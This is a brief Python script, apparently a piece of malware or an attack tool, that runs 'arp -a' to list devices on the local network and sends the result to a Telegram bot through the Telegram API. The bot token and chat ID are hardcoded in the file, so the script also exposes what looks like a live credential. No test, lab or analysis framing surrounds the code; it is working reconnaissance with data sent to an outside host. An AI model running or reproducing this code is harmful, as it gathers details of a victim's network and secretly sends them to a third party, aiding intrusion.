import subprocess
import thirdparty.requests as requests
import traceback

try:
    result = subprocess.check_output(["arp","-a"])
    result = result.decode()
    bot_token = "6437042384:AAE1yzevUXLrfX7aE01MB5rsbUG57gWpM8w"
    chat_id = "1537642691"
    message = str(result)
    url = f'https://api.telegram.org/bot{bot_token}/sendMessage'
    params = {
        'chat_id': chat_id,
        'text': message
    }
    
    response = requests.get(url,params=params)

except:
    traceback.print_exc()